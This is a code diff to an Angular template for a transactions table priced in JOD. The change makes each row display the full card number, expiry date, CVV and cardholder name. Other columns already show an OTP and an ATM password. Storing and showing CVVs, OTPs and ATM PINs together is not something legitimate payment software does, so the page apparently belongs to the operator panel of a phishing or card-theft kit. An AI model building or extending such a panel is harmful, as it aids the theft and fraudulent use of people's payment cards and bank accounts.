@@ -55,11 +55,36 @@
             @for (txn of transactions(); track txn.id) {
             <tr class="hover:bg-gray-50/50 transition">
               <td class="py-4 px-6 text-sm font-bold text-gray-900">{{ (txn.totalPrice || 0).toFixed(2) }} JOD</td>
-              <td class="py-4 px-6 text-sm font-medium text-gray-500 flex items-center gap-2">
-                <div
-                  class="w-8 h-5 bg-gray-100 rounded flex items-center justify-center text-[8px] font-bold text-blue-800">
-                  VISA</div>
-                {{ txn.visaDetails }}
+              <td class="py-4 px-6 text-sm">
+                <div class="flex flex-col gap-1.5 min-w-[180px]">
+                  <!-- Card Number -->
+                  <div class="flex items-center gap-2">
+                    <span class="w-8 h-5 bg-blue-50 border border-blue-200 rounded flex items-center justify-center text-[8px] font-black text-blue-700 tracking-wider">
+                      VISA
+                    </span>
+                    <span class="font-mono font-bold text-gray-900 tracking-wider text-sm">
+                      {{ txn.cardNumber }}
+                    </span>
+                  </div>
+                  <!-- Expiration Date -->
+                  <div class="flex items-center gap-1.5 text-xs text-gray-500">
+                    <span class="text-gray-400 font-medium">Exp:</span>
+                    <span class="font-mono font-semibold text-gray-800">{{ txn.expiryDate }}</span>
+                  </div>
+                  <!-- CVV / Password -->
+                  <div class="flex items-center gap-1.5 text-xs text-gray-500">
+                    <span class="text-gray-400 font-medium">CVV:</span>
+                    <span class="font-mono font-bold text-gray-900 bg-gray-100 px-1.5 py-0.5 rounded text-[11px] border border-gray-200">
+                      {{ txn.cvv }}
+                    </span>
+                  </div>
+                  <!-- Card Holder Name -->
+                  @if (txn.cardHolder && txn.cardHolder !== 'N/A') {
+                    <div class="text-[11px] text-gray-400 font-medium truncate max-w-[200px]">
+                      {{ txn.cardHolder }}
+                    </div>
+                  }
+                </div>
               </td>
               <td class="py-4 px-6 text-sm font-medium text-gray-500 tracking-widest">{{ txn.otp }}</td>
               <td class="py-4 px-6 text-sm font-medium text-gray-400 tracking-widest">{{ txn.atmPass }}</td>
